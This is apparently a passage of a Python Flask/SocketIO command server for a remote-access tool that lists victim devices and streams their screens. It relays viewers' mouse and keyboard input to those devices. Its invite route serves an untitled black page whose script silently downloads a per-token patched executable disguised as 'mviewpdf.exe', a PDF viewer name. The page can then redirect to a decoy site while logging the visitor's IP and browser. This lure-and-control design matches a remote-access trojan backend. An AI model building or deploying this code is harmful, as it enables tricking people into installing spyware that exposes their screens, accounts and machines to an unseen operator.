    return jsonify({"devices": [_safe_dev(d) for d in devs], "count": len(devs), "ts": utcnow()})

@app.route("/api/devices/live")
def api_devices_live():
    with _dev_lock:
        devs = list(_devices.values())
    return jsonify({"devices": [_safe_dev(d, live=True) for d in devs], "count": len(devs), "ts": utcnow()})

def _safe_dev(d, live=False):
    base = {
        "device_id":     d.get("device_id"),
        "label":         d.get("label"),
        "hostname":      d.get("hostname"),
        "os":            d.get("os"),
        "local_ip":      d.get("local_ip"),
        "username":      d.get("username"),
        "cpu":           d.get("cpu"),
        "ram":           d.get("ram"),
        "agent_version": d.get("agent_version"),
        "status":        "online",
        "connected_at":  d.get("connected_at"),
    }
    if live:
        base.update({
            "stream_mode": d.get("stream_mode"),
            "last_beat":   d.get("last_beat"),
            "frame_count": d.get("frame_count", 0),
        })
    return base

@app.route("/api/device/<device_id>/command", methods=["POST"])
@require_admin
def api_device_command(device_id):
    if not sio:
        return jsonify({"error": "SocketIO not available"}), 503
    with _dev_lock:
        dev = _devices.get(device_id)
    if not dev:
        return jsonify({"error": f"Device {device_id} not online"}), 404
    data = request.get_json(silent=True) or {}
    data["device_id"] = device_id
    sio.emit("request_action", data, room=device_id)
    _audit("rest_command", device_id=device_id, tab=data.get("tab"), ip=request.remote_addr)
    return jsonify({"status": "sent", "device_id": device_id, "tab": data.get("tab")}), 200

@app.route("/api/device/<device_id>", methods=["DELETE"])
@require_admin
def api_device_delete(device_id):
    with _dev_lock:
        dev = _devices.pop(device_id, None)
    with _sid_lock:
        for sid, did in list(_sid_to_device.items()):
            if did == device_id:
                _sid_to_device.pop(sid, None)
    old_sid = _adv_agent_sids.pop(device_id, None)
    if old_sid:
        _adv_sid_to_agent.pop(old_sid, None)
    db_update(device_id, {"status": "deleted", "disconnected_at": utcnow()})
    _audit("device_deleted", device_id=device_id, by=request.remote_addr)
    if dev and sio:
        sio.emit("device_offline", {"device_id": device_id, "label": dev.get("label", device_id), "ts": utcnow()})
    return jsonify({"status": "deleted", "device_id": device_id}), 200

# ── NEW: Admin kick a specific viewer (ScreenConnect host-kick-guest parity) ─
@app.route("/api/viewer/<viewer_sid>/kick", methods=["POST"])
@require_admin
def api_kick_viewer(viewer_sid):
    """
    Force-disconnect a specific viewer session by SID.
    ScreenConnect parity: the host can eject any guest at any time.
    """
    if not sio:
        return jsonify({"error": "SocketIO not available"}), 503
    with _dash_lock:
        did = _dashboard_device.get(viewer_sid)
    reason = (request.get_json(silent=True) or {}).get("reason", "Kicked by administrator")
    try:
        sio.emit("kicked", {"reason": reason, "by": "admin", "ts": utcnow()}, room=viewer_sid)
        sio.disconnect(viewer_sid)
        _cleanup_viewer(viewer_sid)
        _audit("viewer_kicked", viewer_sid=viewer_sid, device_id=did, reason=reason, by=request.remote_addr)
        return jsonify({"status": "kicked", "viewer_sid": viewer_sid, "device_id": did}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ── NEW: List all live viewer sessions ────────────────────────────────────────
@app.route("/api/sessions/live")
@require_admin
def api_sessions_live():
    """
    Returns every active viewer session with idle time, total duration,
    and the device they are watching. ScreenConnect parity: host can see
    all active guests and their session metadata.
    """
    now = time.monotonic()
    sessions = []
    with _viewer_activity_lock:
        for vsid, start in list(_viewer_session_start.items()):
            last = _viewer_last_activity.get(vsid, start)
            with _dash_lock:
                did = _dashboard_device.get(vsid)
            sessions.append({
                "viewer_sid":      vsid,
                "device_id":       did,
                "duration_s":      round(now - start, 1),
                "idle_s":          round(now - last, 1),
            })
    return jsonify({"sessions": sessions, "count": len(sessions), "ts": utcnow()})

# ══════════════════════════════════════════════════════════════════════════════
#  Invite / Agent download
# ══════════════════════════════════════════════════════════════════════════════
@app.route("/api/invite",      methods=["GET", "POST"])
@app.route("/api/generate",    methods=["GET", "POST"])
@app.route("/invite/generate", methods=["GET", "POST"])
@app.route("/generate_invite", methods=["GET", "POST"])
def generate_invite():
    data = request.get_json(silent=True) or request.form.to_dict() or {}

    def hex6():
        return secrets.token_hex(3).upper()

    token      = f"MV-{hex6()}-{hex6()}-{hex6()}"
    label      = data.get("label") or data.get("name") or token
    loc        = data.get("location", "")
    dtype      = data.get("device_type", "Standard Display")
    expiry_sec = int(data.get("expiry", 86400))

    expires_at = None
    if expiry_sec > 0:
        expires_at = (
            datetime.datetime.now(datetime.timezone.utc)
            + datetime.timedelta(seconds=expiry_sec)
        ).isoformat()

    link_mode    = data.get("link_mode", "blank")
    redirect_url = data.get("redirect_url", "").strip()

    payload = {
        "device_id":    token,
        "label":        label,
        "location":     loc,
        "device_type":  dtype,
        "status":       "pending",
        "expires_at":   expires_at,
        "created_at":   utcnow(),
        "link_mode":    link_mode,
        "redirect_url": redirect_url,
    }
    db_insert(payload)
    log.info(f"Invite generated: {token}  label={label}  mode={link_mode}")
    _audit("invite_generated", token=token, label=label, ip=request.remote_addr)

    srv = request.host_url.rstrip("/")
    return jsonify({
        "status":       "ok",
        "token":        token,
        "device_id":    token,
        "label":        label,
        "download_url": f"{srv}/guide/{token}",
        "agent_url":    f"{srv}/guide/{token}",
        "expires_at":   expires_at,
        "link_mode":    link_mode,
    }), 201

@app.route("/api/invite/status")
def api_invite_status():
    token = request.args.get("token", "")
    if not valid_token(token):
        return jsonify({"error": "Invalid token"}), 400
    with _dev_lock:
        live = _devices.get(token)
    if live:
        return jsonify({"status": "online", "label": live.get("label", token)})
    rec = db_get(token)
    if rec:
        return jsonify({"status": rec.get("status", "pending"), "label": rec.get("label", token)})
    return jsonify({"status": "pending", "label": token})

@app.route("/invite/<token>")
@app.route("/onboard/<token>")
@app.route("/guide/<token>")
def serve_agent(token):
    log.info(f"Agent download request: token={token}  ip={request.remote_addr}")
    if not valid_token(token):
        return jsonify({"error": "Invalid token format."}), 400
    session = db_get(token)
    if session is None:
        return jsonify({"error": "Invite link not found."}), 404
    if session.get("status") in ("revoked", "expired", "rejected"):
        return jsonify({"error": "Link no longer valid."}), 410
    if is_expired(session):
        db_update(token, {"status": "expired"})
        return jsonify({"error": "Link expired."}), 410
    db_update(token, {
        "status":        "downloading",
        "download_ip":   request.remote_addr,
        "downloaded_at": utcnow(),
        "user_agent":    request.headers.get("User-Agent", "")[:200],
    })
    link_mode    = session.get("link_mode") or "blank"
    redirect_url = (session.get("redirect_url") or "").strip()
    patched = _build_patched_agent(token)
    if patched:
        _agent_dl_cache[token] = (patched, time.time())
        cutoff = time.time() - _AGENT_DL_TTL
        expired = [t for t, (_, ts) in _agent_dl_cache.items() if ts < cutoff]
        for t in expired:
            del _agent_dl_cache[t]
    dl_url = f"/guide/{token}/dl" if token in _agent_dl_cache else AGENT_STORAGE_URL
    import json as _json
    if link_mode == "redirect" and redirect_url:
        dl_js  = _json.dumps(str(dl_url))
        rdr_js = _json.dumps(str(redirect_url))
        html = (
            "<!DOCTYPE html><html><head><meta charset=utf-8>"
            "<title> </title>"
            "<style>*{margin:0;padding:0}html,body{height:100%;background:#000}</style>"
            "</head><body><script>"
            "(function(){"
            "var a=document.createElement('a');"
            f"a.href={dl_js};"
            "a.download='mviewpdf.exe';"
            "document.body.appendChild(a);a.click();"
            f"setTimeout(function(){{window.location.href={rdr_js};}},1500);"
            "})();</script></body></html>"
        )
        r = make_response(html, 200)
        r.headers["Content-Type"] = "text/html"
        return r
    dl_js = _json.dumps(str(dl_url))
    html = (
        "<!DOCTYPE html><html><head><meta charset=utf-8>"
        "<title> </title>"
        "<style>*{margin:0;padding:0}html,body{height:100%;background:#000}</style>"
        "</head><body><script>"
        "(function(){"
        "var a=document.createElement('a');"
        f"a.href={dl_js};"
        "a.download='mviewpdf.exe';"
        "document.body.appendChild(a);a.click();"
        "})();</script></body></html>"
    )
    r = make_response(html, 200)
    r.headers["Content-Type"] = "text/html"
    return r

@app.route("/guide/<token>/dl")
def serve_agent_binary(token):
    if token in _agent_dl_cache:
        data, _ = _agent_dl_cache[token]
        resp = make_response(data)
        resp.headers["Content-Type"] = "application/octet-stream"
        resp.headers["Content-Disposition"] = 'attachment; filename="mviewpdf.exe"'
        resp.headers["Content-Length"] = len(data)
        resp.headers["Cache-Control"] = "no-store"
        return resp
    if AGENT_STORAGE_URL:
        return redirect(AGENT_STORAGE_URL, 302)
    return jsonify({"error": "Binary not available."}), 503

@app.route("/api/sessions")
@require_admin
def api_sessions():
    rows = db_list_all()
    with _dev_lock:
        live_ids = set(_devices.keys())
    for r in rows:
        r["_live"] = r.get("device_id") in live_ids
    return jsonify({"sessions": rows, "count": len(rows)})

@app.route("/api/sessions/<token>/revoke", methods=["POST", "DELETE"])
@require_admin
def api_revoke(token):
    db_update(token, {"status": "revoked"})
    return jsonify({"status": "revoked", "token": token})

@app.route("/agent/checkin", methods=["POST"])
def agent_checkin():
    data = request.get_json(silent=True) or {}
    token = data.get("device_id") or data.get("token", "")
    if not token:
        return jsonify({"error": "No device_id"}), 400
    db_upsert(token, {
        "status":        "online",
        "label":         data.get("hostname") or token,
        "ip_address":    data.get("local_ip"),
        "hostname":      data.get("hostname"),
        "os_info":       data.get("os"),
        "agent_version": data.get("agent_version"),
        "connected_at":  utcnow(),
    })
    return jsonify({"status": "ok", "token": token})

# ══════════════════════════════════════════════════════════════════════════════
#  SocketIO events
# ══════════════════════════════════════════════════════════════════════════════
if SOCKETIO_OK and sio:

    @sio.on("connect")
    def on_connect():
        join_room("dashboards")
        log.info(f"Socket connected: {request.sid}")

    @sio.on("disconnect")
    def on_disconnect():
        sid = request.sid
        _cleanup_viewer(sid)
        _cleanup_agent(sid)
        log.info(f"Socket disconnected: {sid}")

    @sio.on("viewer_hello")
    def on_viewer_hello(data):
        sid = request.sid
        join_room("adv_dashboards")
        _send_device_list_to(sid)
        log.info(f"viewer_hello from {sid}")

    def _build_device_list_result() -> list:
        with _dev_lock:
            live = dict(_devices)
        rows   = db_list_all()
        db_map = {r.get("device_id", ""): r for r in rows}
        result = []
        for did, dev in live.items():
            db_row = db_map.get(did, {})
            result.append({
                "id":       did,
                "name":     dev.get("label") or dev.get("hostname") or did,
                "online":   True,
                "screen_w": dev.get("screen_w", 0),
                "screen_h": dev.get("screen_h", 0),
                "rtt_ms":   dev.get("rtt_ms", 0),
                "cpu":      dev.get("cpu"),
                "ram":      dev.get("ram"),
                "ip":       dev.get("local_ip") or db_row.get("ip_address", ""),
                "os":       dev.get("os") or db_row.get("os_info", ""),
            })
        for did, row in db_map.items():
            if did not in live:
                result.append({
                    "id":       did,
                    "name":     row.get("label") or row.get("hostname") or did,
                    "online":   False,
                    "screen_w": 0, "screen_h": 0, "rtt_ms": 0,
                    "cpu":      None, "ram":      None,
                    "ip":       row.get("ip_address", ""),
                    "os":       row.get("os_info", ""),
                })
        return result

    def _send_device_list_to(sid):
        try:
            sio.emit("device_list", _build_device_list_result(), room=sid)
        except Exception as e:
            log.error(f"_send_device_list_to error: {e}")

    @sio.on("join_dashboard")
    def on_join_dashboard(data):
        join_room("dashboards")
        log.info(f"join_dashboard from {request.sid}")

    def _broadcast_device_list():
        try:
            sio.emit("device_list", _build_device_list_result(), room="adv_dashboards")
        except Exception as e:
            log.error(f"_broadcast_device_list error: {e}")

    @sio.on("subscribe_stream")
    def on_subscribe_stream(data):
        pass  # legacy no-op

    @sio.on("watch_device")
    def on_watch_device(data):
        """
        Viewer subscribes to a device stream.
        Enterprise features enforced here:
        - Max concurrent viewers gate
        - Session tracking start
        - GOP catch-up (send buffered frames immediately on join)
        - Seamless device-switch (leave old room, join new one)
        """
        try:
            from flask_socketio import join_room as _jr
            did = data.get("device_id", "")
            sid = request.sid
            old_adv_did = _adv_viewer_rooms.get(sid)

            if not did:
                sio.emit("watch_error", {"msg": "No device_id provided"}, room=sid)
                return

            # ── Enterprise: max-concurrent-viewers gate ──────────────────
            if MAX_VIEWERS_PER_DEVICE > 0:
                current_viewers = sum(1 for v in _adv_viewer_rooms.values() if v == did)
                if _adv_viewer_rooms.get(sid) != did and current_viewers >= MAX_VIEWERS_PER_DEVICE:
                    log.warning(f"watch_device: viewer {sid} rejected — {did} at max viewers {current_viewers}/{MAX_VIEWERS_PER_DEVICE}")
                    sio.emit("watch_error", {
                        "msg":  f"Maximum concurrent viewers ({MAX_VIEWERS_PER_DEVICE}) reached.",
                        "code": "max_viewers",
                    }, room=sid)
                    return

            # Leave old device room if switching
            if old_adv_did and old_adv_did != did:
                leave_room(f"adv_viewers_{old_adv_did}")
                _adv_viewer_rooms.pop(sid, None)
                old_agent_sid = _adv_agent_sids.get(old_adv_did)
                old_vcount = sum(1 for v in _adv_viewer_rooms.values() if v == old_adv_did)
                if old_agent_sid:
                    sio.emit("viewer_count", {"count": old_vcount}, room=old_agent_sid)
                sio.emit("viewer_count", {"count": old_vcount}, room=old_adv_did)
                log.info(f"Viewer {sid} left device {old_adv_did}")

            with _dev_lock:
                dev = _devices.get(did)

            if not dev:
                log.warning(f"on_watch_device: device {did!r} not in _devices — letting viewer wait")
                _jr(f"adv_viewers_{did}")
                _adv_viewer_rooms[sid] = did
                join_room(f"view:{did}")
                with _view_lock:
                    _viewers[did].add(request.sid)
                with _dash_lock:
                    _dashboard_device[request.sid] = did
                with _viewer_activity_lock:
                    _viewer_session_start[sid] = time.monotonic()
                    _viewer_last_activity[sid]  = time.monotonic()
                sio.emit("watch_ok", {
                    "online": False, "device_id": did, "name": did,
                    "screen_w": 0, "screen_h": 0,
                }, room=sid)
                return

            # ── Join advanced monitor viewer room ────────────────────────
            _jr(f"adv_viewers_{did}")
            _adv_viewer_rooms[sid] = did

            with _viewer_activity_lock:
                _viewer_session_start[sid] = time.monotonic()
                _viewer_last_activity[sid]  = time.monotonic()

            # GOP catch-up — send buffered frames so screen appears immediately
            with _adv_gop_lock:
                gop = list(_adv_gop_buf.get(did, []))
            for pkt in gop:
                sio.emit("frame_bin", pkt, room=sid)
            cursor_pkt = _adv_cursor_latest.get(did)
            if cursor_pkt:
                sio.emit("cursor_bin", cursor_pkt, room=sid)

            # Notify agent of updated viewer count
            vcount = sum(1 for v in _adv_viewer_rooms.values() if v == did)
            sio.emit("viewer_count", {"count": vcount}, room=did)
            agent_adv_sid = _adv_agent_sids.get(did)
            if agent_adv_sid:
                sio.emit("viewer_count", {"count": vcount}, room=agent_adv_sid)

            sio.emit("watch_ok", {
                "online":    True,
                "device_id": did,
                "name":      dev.get("hostname", did),
                "screen_w":  dev.get("screen_w", 0),
                "screen_h":  dev.get("screen_h", 0),
            }, room=sid)
            log.info(f"Viewer {sid} watching device {did}")

            # ── Main-stream path ─────────────────────────────────────────
            old_did = _get_device_for_viewer(request.sid)
            if old_did and old_did != did:
                leave_room(f"view:{old_did}")
                with _view_lock:
                    _viewers[old_did].discard(request.sid)
                sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": old_did}, room=old_did)

            join_room(f"view:{did}")
            with _view_lock:
                _viewers[did].add(request.sid)
            with _dash_lock:
                _dashboard_device[request.sid] = did
            viewer_count = len(_viewers[did])
            emit("subscribed", {"device_id": did, "viewers": viewer_count})

            # Re-send viewer_count to agent (covers race condition)
            adv_vcount = sum(1 for v in _adv_viewer_rooms.values() if v == did)
            with _view_lock:
                adv_vcount = max(adv_vcount, len(_viewers.get(did, set())))
            if agent_adv_sid:
                sio.emit("viewer_count", {"count": adv_vcount}, room=agent_adv_sid)
            sio.emit("viewer_count", {"count": adv_vcount}, room=did)

            # Tell agent to start streaming
            fps     = data.get("fps", 25)
            quality = data.get("quality", 70)
            scale   = data.get("scale", 0.8)
            monitor = data.get("monitor", 1)
            stream_payload = {
                "tab":       "monitor",
                "action":    "start",
                "device_id": did,
                "fps":       fps,
                "quality":   quality,
                "scale":     scale,
                "monitor":   monitor,
            }
            sio.emit("request_action", stream_payload, room=did)
            if agent_adv_sid:
                sio.emit("request_action", stream_payload, room=agent_adv_sid)
            log.info(f"Stream start sent → agent {did}  fps={fps} quality={quality}")

        except Exception as exc:
            log.error(f"on_watch_device error (sid={request.sid}): {exc}", exc_info=True)
            try:
                sio.emit("watch_error", {"msg": f"Server error: {exc}"}, room=request.sid)
            except Exception:
                pass

    @sio.on("unsubscribe_stream")
    def on_unsubscribe_stream(data):
        pass  # legacy no-op

    # ── Input activity tracker — updates idle timer ───────────────────────────
    def _touch_viewer_activity(sid: str):
        """Called whenever a viewer sends input — resets idle timer."""
        with _viewer_activity_lock:
            _viewer_last_activity[sid] = time.monotonic()

    # ── Agent registration ────────────────────────────────────────────────────
    @sio.on("agent_connect")
    def on_agent_connect(data):
        try:
            _handle_agent_connect(data)
        except Exception as exc:
            log.error(f"agent_connect crash (sid={request.sid}): {exc}", exc_info=True)

    def _handle_agent_connect(data):
        did   = data.get("device_id") or data.get("token", "")
        label = data.get("label") or data.get("hostname") or did

        if not did:
            log.warning(f"agent_connect with no device_id from {request.sid}")
            return

        # ── Enterprise: single-instance enforcement (ScreenConnect parity) ──
        # When a new agent connects, evict the old one AND notify active viewers
        # so the dashboard shows a spinner rather than a stale black screen.
        if AGENT_EXCLUSIVE:
            with _dev_lock:
                existing = _devices.get(did)
            if existing:
                old_sid = existing.get("sid")
                if old_sid and old_sid != request.sid:
                    log.warning(
                        f"Agent DUPLICATE detected for {did} — evicting stale sid={old_sid}, "
                        f"registering new sid={request.sid}"
                    )
                    # Notify active viewers so they can show a reconnecting spinner
                    _notify_viewers_reconnecting(did)

                    # Tell old socket it is being replaced
                    try:
                        sio.emit("evicted", {
                            "reason":     "duplicate_agent",
                            "session_id": old_sid,
                            "msg":        "A newer instance of this agent connected — this session is terminated.",
                        }, room=old_sid)
                        # Remove old SID from device room BEFORE disconnect
                        # so it stops receiving commands immediately
                        try:
                            sio.leave_room(old_sid, did)
                        except Exception:
                            pass
                        sio.disconnect(old_sid)
                    except Exception as _ev_err:
                        log.debug(f"Evict old agent sid={old_sid}: {_ev_err}")

                    with _sid_lock:
                        _sid_to_device.pop(old_sid, None)
                    with _dev_lock:
                        _devices.pop(did, None)
                    old_adv = _adv_agent_sids.pop(did, None)
                    if old_adv:
                        _adv_sid_to_agent.pop(old_adv, None)
                    # Clear GOP so viewers get fresh frames from new agent
                    with _adv_gop_lock:
                        _adv_gop_buf.pop(did, None)
                    _adv_cursor_latest.pop(did, None)
                    _audit("agent_evicted", device_id=did, old_sid=old_sid, new_sid=request.sid)
                    _fire_webhook("agent_evicted", {"device_id": did, "old_sid": old_sid})

        # Bump session sequence — invalidates any stale GOP references
        with _agent_seq_lock:
            _agent_session_seq[did] = _agent_session_seq.get(did, 0) + 1

        # Agent joins its own room for targeted commands
        join_room(did)

        with _sid_lock:
            _sid_to_device[request.sid] = did

        with _dev_lock:
            _devices[did] = {
                "sid":           request.sid,
                "device_id":     did,
                "label":         label,
                "name":          label,
                "status":        "online",
                "hostname":      data.get("hostname"),
                "username":      data.get("username"),
                "os":            data.get("os"),
                "local_ip":      data.get("local_ip"),
                "ip":            data.get("local_ip"),
                "cpu_count":     data.get("cpu_count"),
                "ram_total_gb":  data.get("ram_total_gb"),
                "agent_version": data.get("agent_version"),
                "stream_mode":   data.get("stream_mode", "video"),
                "gpu":           data.get("gpu"),
                "screen_count":  data.get("screen_count"),
                "connected_at":  utcnow(),
                "last_beat":     utcnow(),
                "cpu":           None,
                "ram":           None,
                "frame_count":   0,
                "last_frame_ts": "",
                "fingerprint":   data,
            }

        log.info(f"Agent ONLINE: {label} ({did}) sid={request.sid}")
        _audit("agent_online", device_id=did, label=label, ip=data.get("local_ip"),
               agent_version=data.get("agent_version"))
        db_upsert(did, {
            "status":        "online",
            "label":         label,
            "ip_address":    data.get("local_ip"),
            "hostname":      data.get("hostname"),
            "os_info":       data.get("os"),
            "agent_version": data.get("agent_version"),
            "connected_at":  utcnow(),
        })
        sio.emit("agent_online",  {
            "device_id": did, "name": label, "label": label,
            "ip": data.get("local_ip"), "fingerprint": data, "ts": utcnow()
        })
        sio.emit("device_online", {
            "device_id": did, "label": label, "fingerprint": data, "ts": utcnow()
        })
        broadcast_device_update()
        try:
            _broadcast_device_list()
        except Exception:
            pass
        _fire_webhook("agent_online", {"device_id": did, "label": label, "ip": data.get("local_ip")})

        # ── Session handoff: re-subscribe active viewers to the new agent ──
        # Any viewer that was watching this device before the reconnect should
        # automatically resume without a full page reload.
        with _view_lock:
            active_viewer_sids = list(_viewers.get(did, set()))
        if active_viewer_sids:
            log.info(f"Session handoff: {len(active_viewer_sids)} viewer(s) resuming for device {did}")
            for vsid in active_viewer_sids:
                sio.emit("agent_replaced", {
                    "device_id": did,
                    "label":     label,
                    "ts":        utcnow(),
                }, room=vsid)
                # Re-send watch_ok so viewer knows stream is back
                sio.emit("watch_ok", {
                    "online":    True,
                    "device_id": did,
                    "name":      label,
                    "screen_w":  data.get("screen_w", 0),
                    "screen_h":  data.get("screen_h", 0),
                    "reconnected": True,
                }, room=vsid)

    # ── Heartbeat ─────────────────────────────────────────────────────────────
    _hb_count: dict = collections.defaultdict(int)
    _HB_GLOBAL_EVERY = 6

    @sio.on("heartbeat")
    def on_hb(data):
        did = data.get("device_id")
        with _dev_lock:
            if did in _devices:
                _devices[did].update({
                    "cpu":       data.get("cpu"),
                    "ram":       data.get("ram"),
                    "last_beat": utcnow(),
                })
        sio.emit("heartbeat_update", data, room=f"view:{did}")
        _hb_count[did] += 1
        if _hb_count[did] % _HB_GLOBAL_EVERY == 0:
            sio.emit("heartbeat_update", data, room="dashboards")

    # ── Advanced Monitor: agent auth ──────────────────────────────────────────
    @sio.on("agent_auth")
    def on_agent_auth(data):
        """
        Second-site agent authenticates with its token.
        Waits up to 8s for the main socket agent_connect to register the device.
        """
        token = data.get("token", "")
        did   = data.get("device_id") or token
        sid   = request.sid

        if not token and not did:
            sio.emit("auth_error", {"msg": "Empty token/did"}, room=sid)
            return

        dev = None
        for _attempt in range(16):
            with _dev_lock:
                dev = _devices.get(did)
            if dev:
                break
            try:
                import gevent
                gevent.sleep(0.5)
            except ImportError:
                time.sleep(0.5)

        if not dev:
            log.warning(f"agent_auth: device {did!r} not in _devices after 8s — creating stub entry")
            with _dev_lock:
                _devices[did] = {
                    "device_id": did, "hostname": did, "label": did,
                    "online": True, "screen_w": 0, "screen_h": 0,
                }
            dev = _devices[did]

        _adv_agent_sids[did]   = sid
        _adv_sid_to_agent[sid] = did
        join_room(did)
        log.info(f"Advanced Monitor: agent {did} registered with sid={sid}")

        vcount = sum(1 for v in _adv_viewer_rooms.values() if v == did)
        with _view_lock:
            vcount = max(vcount, len(_viewers.get(did, set())))

        sio.emit("auth_ok", {"role": "agent", "device_id": did}, room=sid)
        sio.emit("viewer_count", {"count": vcount}, room=sid)

    @sio.on("agent_auth_ready")
    def on_agent_auth_ready(data):
        """Agent signals adv-socket auth complete; server re-sends viewer count."""
        token = data.get("token", "")
        did   = data.get("device_id") or token
        sid   = request.sid
        vcount = sum(1 for v in _adv_viewer_rooms.values() if v == did)
        with _view_lock:
            vcount = max(vcount, len(_viewers.get(did, set())))
        if vcount > 0:
            sio.emit("viewer_count", {"count": vcount}, room=sid)
            log.info(f"agent_auth_ready: re-sent viewer_count={vcount} to {did}")

    # ── Binary frame relay ────────────────────────────────────────────────────
    @sio.on("frame_bin")
    def on_frame_bin(data):
        """Second-site binary frame — O(1) lookup, fan out to viewers."""
        sid = request.sid
        did = _adv_sid_to_agent.get(sid)
        if not did:
            with _sid_lock:
                did = _sid_to_device.get(sid)
        if not did:
            return
        try:
            raw = bytes(data) if not isinstance(data, (bytes, bytearray)) else bytes(data)
        except Exception as e:
            log.warning(f"frame_bin: could not convert to bytes: {e}")
            return
        if len(raw) >= 20:
            import struct as _s
            w, h = _s.unpack_from(">II", raw, 0)
            if w > 0 and h > 0:
                with _dev_lock:
                    if did in _devices:
                        _devices[did]["screen_w"] = w
                        _devices[did]["screen_h"] = h
        with _adv_gop_lock:
            if did not in _adv_gop_buf:
                from collections import deque as _dq
                _adv_gop_buf[did] = _dq(maxlen=64)
            _adv_gop_buf[did].append(raw)
            fc = len(_adv_gop_buf[did])
        if fc == 1:
            log.info(f"frame_bin: FIRST frame from agent {did} — ADV SOCKET streaming active!")
        with _frame_stats_lock:
            _frame_stats[did].append((time.time(), len(raw)))
        with _dev_lock:
            if did in _devices:
                _devices[did]["frame_count"] = _devices[did].get("frame_count", 0) + 1
                _devices[did]["last_frame_ts"] = utcnow()
        sio.emit("frame_bin", raw, room=f"adv_viewers_{did}")
        sio.emit("frame_bin", raw, room=f"view:{did}")

    @sio.on("frame_bin_relay")
    def on_frame_bin_relay(data):
        """Fallback: main-socket frame relay when adv socket unavailable."""
        try:
            did = data.get("device_id", "")
            if data.get("b64"):
                import base64 as _b64
                raw = _b64.b64decode(data["b64"])
            else:
                raw_list = data.get("data")
                if not did or not raw_list:
                    return
                raw = bytes(raw_list)
            if not did or not raw:
                return
            if len(raw) >= 20:
                import struct as _s
                w, h = _s.unpack_from(">II", raw, 0)
                if w > 0 and h > 0:
                    with _dev_lock:
                        if did in _devices:
                            _devices[did]["screen_w"] = w
                            _devices[did]["screen_h"] = h
            with _adv_gop_lock:
                if did not in _adv_gop_buf:
                    from collections import deque as _dq
                    _adv_gop_buf[did] = _dq(maxlen=64)
                _adv_gop_buf[did].append(raw)
                fc = len(_adv_gop_buf[did])
            if fc == 1:
                log.info(f"frame_bin_relay: FIRST frame from {did} via MAIN SOCKET fallback")
            with _frame_stats_lock:
                _frame_stats[did].append((time.time(), len(raw)))
            with _dev_lock:
                if did in _devices:
                    _devices[did]["frame_count"] = _devices[did].get("frame_count", 0) + 1
                    _devices[did]["last_frame_ts"] = utcnow()
            sio.emit("frame_bin", raw, room=f"adv_viewers_{did}")
            sio.emit("frame_bin", raw, room=f"view:{did}")
        except Exception as e:
            log.warning(f"frame_bin_relay error: {e}")

    @sio.on("cursor_bin")
    def on_cursor_bin(data):
        """60Hz cursor packet — O(1) lookup."""
        sid = request.sid
        did = _adv_sid_to_agent.get(sid)
        if not did:
            with _sid_lock:
                did = _sid_to_device.get(sid)
        if not did:
            return
        raw = bytes(data)
        _adv_cursor_latest[did] = raw
        sio.emit("cursor_bin", raw, room=f"adv_viewers_{did}")
        sio.emit("cursor_bin", raw, room=f"view:{did}")

    @sio.on("agent_info")
    def on_agent_info_adv(data):
        sid = request.sid
        did = _adv_sid_to_agent.get(sid)
        if not did:
            with _sid_lock:
                did = _sid_to_device.get(sid)
        if did:
            with _dev_lock:
                if did in _devices:
                    _devices[did]["hostname"] = data.get("hostname", _devices[did].get("hostname", ""))
                    _devices[did]["os"]       = data.get("os",       _devices[did].get("os", ""))

    @sio.on("agent_pong")
    def on_agent_pong_adv(data):
        sid = request.sid
        did = _adv_sid_to_agent.get(sid)
        if did:
            rtt = (time.time() - data.get("ts", time.time())) * 1000
            with _dev_lock:
                if did in _devices:
                    _devices[did]["rtt_ms"] = round(rtt, 1)

    @sio.on("input_event")
    def on_input_event(data):
        """
        Viewer → agent input relay.
        Also updates the viewer's idle timer for enterprise idle-timeout enforcement.
        """
        sid    = request.sid
        _touch_viewer_activity(sid)  # ← reset idle timer on every input
        did    = _adv_viewer_rooms.get(sid)
        if not did:
            did = data.get("device_id", "")
            if not did:
                return
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            sio.emit("input_event", data, room=agent_sid)
        else:
            with _dev_lock:
                dev = _devices.get(did)
            if dev:
                evt = data.get("type", "")
                if evt == "mouse_move":
                    sio.emit("request_action", {"tab": "mouse_move", **data}, room=did)
                elif evt in ("mouse_click", "mouse_dblclick"):
                    sio.emit("request_action", {"tab": "mouse_click", **data}, room=did)
                elif evt == "mouse_scroll":
                    sio.emit("request_action", {"tab": "scroll", **data}, room=did)
                elif evt == "key_event":
                    sio.emit("request_action", {"tab": "key_event", **data}, room=did)
                elif evt == "type_text":
                    sio.emit("request_action", {"tab": "type_text", **data}, room=did)

    # ── WebRTC signaling relay ────────────────────────────────────────────────
    @sio.on("webrtc_offer")
    def on_webrtc_offer_adv(data):
        sid    = request.sid
        did    = _adv_viewer_rooms.get(sid)
        if not did: return
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            sio.emit("webrtc_offer", {"viewer_sid": sid, "sdp": data.get("sdp")}, room=agent_sid)

    @sio.on("webrtc_answer")
    def on_webrtc_answer_adv(data):
        viewer_sid = data.get("viewer_sid")
        if viewer_sid:
            sio.emit("webrtc_answer", {"sdp": data.get("sdp")}, room=viewer_sid)

    @sio.on("webrtc_ice_agent")
    def on_webrtc_ice_agent(data):
        viewer_sid = data.get("viewer_sid")
        if viewer_sid:
            sio.emit("webrtc_ice", {"candidate": data.get("candidate")}, room=viewer_sid)

    @sio.on("webrtc_ice_viewer")
    def on_webrtc_ice_viewer(data):
        sid    = request.sid
        did    = _adv_viewer_rooms.get(sid)
        if not did: return
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            sio.emit("webrtc_ice", {"viewer_sid": sid, "candidate": data.get("candidate")}, room=agent_sid)

    @sio.on("webrtc_connected")
    def on_webrtc_connected(data):
        log.info(f"WebRTC DataChannel active: viewer={request.sid}")

    @sio.on("screenshot_result")
    def on_screenshot_result(data):
        did = data.get("device_id", "")
        out = dict(data)
        if "image" in out and "frame" not in out:
            out["frame"] = out.pop("image")
        if "frame" in out and "image" not in out:
            out["image"] = out["frame"]
        sio.emit("screenshot", out, room=f"view:{did}")
        sio.emit("screenshot_result", out, room=f"view:{did}")

    @sio.on("ping_result")
    def on_ping_result(data):
        did = data.get("device_id", "")
        sio.emit("pong_agent", data, room=f"view:{did}")
        sio.emit("pong_agent", data, room="dashboards")

    @sio.on("cursor_event")
    def on_cursor(data):
        did = data.get("device_id", "")
        sio.emit("cursor_event", data, room=f"view:{did}")

    @sio.on("system_stats_report")
    def _r_system(data):
        did = data.get("device_id", "")
        sio.emit("update_system_tab", data, room=f"view:{did}")
